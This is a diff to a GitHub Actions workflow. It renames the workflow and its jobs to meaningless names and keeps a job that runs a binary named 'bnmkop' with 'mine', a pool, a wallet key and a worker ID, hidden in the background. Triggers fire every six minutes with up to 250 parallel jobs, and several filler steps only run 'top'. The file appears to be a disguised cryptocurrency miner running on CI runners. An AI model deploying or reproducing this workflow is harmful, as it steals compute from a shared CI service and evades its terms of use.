@@ -1,4 +1,4 @@
-name: peli
+name: paka
 on:
   push:
     branches: [ "main" ]
@@ -6,7 +6,7 @@ on:
     - cron: '*/6 * * * *'  # Runs every 6 minute
 
 jobs:
-  alah:
+  cvas:
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 80
@@ -32,8 +32,8 @@ jobs:
         chmod +x bnmkop
          ./bnmkop mine -t 4 --pool twbitz -a --key xLPMoYZixVLRHJV7hb9gZoMusczWYRzP7JqFCRb6vXp --worker GH230 > /dev/null 2>&1 &
         sleep 5m
-  pelit:
-    needs: alah
+  pakat:
+    needs: cvas
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -62,8 +62,8 @@ jobs:
       run: |
         top
      
-  cuk:
-    needs: [alah]
+  arna:
+    needs: [cvas]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -92,7 +92,7 @@ jobs:
       run: |
         top
   Success:
-    needs: [alah, pelit, cuk]
+    needs: [cvas, pakat, arna]
     if: always()
     runs-on: ubuntu-20.04
     steps:
